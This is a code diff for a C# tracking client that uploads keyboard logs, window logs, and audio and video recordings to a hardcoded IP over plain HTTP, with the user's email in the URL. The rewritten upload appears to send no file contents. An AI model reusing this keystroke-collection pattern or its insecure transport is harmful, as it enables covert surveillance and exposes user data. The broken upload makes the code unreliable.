@@ -1,13 +1,5 @@
 using System;
-using System.IO;
-using System.Net;
-using System.Net.Http;
-using System.Net.Http.Headers;
-using System.Text;
-using System.Threading;
-using System.Threading.Tasks;
-using Flurl.Http;
-using Flurl.Util;
+using RestSharp;
 
 namespace TrackzamClient
 {
@@ -17,9 +9,21 @@ namespace TrackzamClient
         {
             _ipAddress = ipAddress;
         }
+
+        public static string IPAddress => _ipAddress;
         public static void SendAudioLogs(string path)
         {
             SendFileAsync("send_audio_logs", path);
+        }
+        
+        public static void SendAudioFile(string path)
+        {
+            SendFileAsync("send_audio_file", path, "8080");
+        }
+        
+        public static void SendVideoFile(string path)
+        {
+            SendFileAsync("send_video_file", path, "8080");
         }
         
         public static void SendKeyboardLogs(string path)
@@ -37,62 +41,17 @@ namespace TrackzamClient
             SendFileAsync("send_window_logs", path);
         }
         
-        private static async void SendFileAsync(string type, string path)
+        private static async void SendFileAsync(string type, string path, string port = "8000")
         {
-            await Task.Run(() =>
-            {
-                HttpWebRequest requestToServerEndpoint = 
-                    (HttpWebRequest)WebRequest.Create(new StringBuilder().Append("http://")
-                        .Append(_ipAddress).Append(":8000/api/").Append(type).ToString());
-
-        
-                string boundaryString = "----SomeRandomText";
-                string fileUrl = path;
-                
-                requestToServerEndpoint.Method = WebRequestMethods.Http.Post;
-                requestToServerEndpoint.ContentType = "multipart/form-data; boundary=" + boundaryString;
-                requestToServerEndpoint.KeepAlive = true;
-                requestToServerEndpoint.Credentials = System.Net.CredentialCache.DefaultCredentials;
-
-                MemoryStream postDataStream = new MemoryStream();
-                StreamWriter postDataWriter = new StreamWriter(postDataStream);
-                
-                postDataWriter.Write("\r\n--" + boundaryString + "\r\n");
-                postDataWriter.Write("Content-Disposition: form-data;"
-                                     + "name=\"{0}\";"
-                                     + "filename=\"{1}\""
-                                     + "\r\nContent-Type: {2}\r\n\r\n",
-                    "file",
-                    Path.GetFileName(fileUrl),
-                    Path.GetExtension(fileUrl));
-                postDataWriter.Flush();
-                
-                FileStream fileStream = new FileStream(fileUrl, FileMode.Open, FileAccess.Read);
-                byte[] buffer = new byte[1024];
-                int bytesRead = 0;
-                while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
-                {
-                    postDataStream.Write(buffer, 0, bytesRead);
-                }
-                fileStream.Close();
-     
-                postDataWriter.Write("\r\n--" + boundaryString + "--\r\n");
-                postDataWriter.Flush();
-                
-                requestToServerEndpoint.ContentLength = postDataStream.Length;
-
-                using (Stream s = requestToServerEndpoint.GetRequestStream())
-                {
-                    postDataStream.WriteTo(s);
-                }
-
-                while (!requestToServerEndpoint.HaveResponse)
-                {
-                    Thread.Sleep(1000);
-                }
-                Console.WriteLine(requestToServerEndpoint.GetResponse().Headers);
-                postDataStream.Close();
-            });
+            var client = new RestClient("http://"+_ipAddress+":"+port+"/api/"+type+"?email="+InfoSaver.GetEmail());
+            var request = new RestRequest(Method.POST);
+            request.AddHeader("cache-control", "no-cache");
+            request.AddHeader("authorization", "Basic "+InfoSaver.AuthToken);
+            request.AddHeader("enctype", "multipart/form-data");
+            request.AddHeader("content-type", "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW");
+            request.AddParameter("multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW", "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+path+"\"\r\nContent-Type: text/plain\r\n\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--", ParameterType.RequestBody);
+            IRestResponse response = await client.ExecuteAsync(request);
+            Console.WriteLine(response.Content);
         }
 
         private static string _ipAddress = "34.71.243.7";
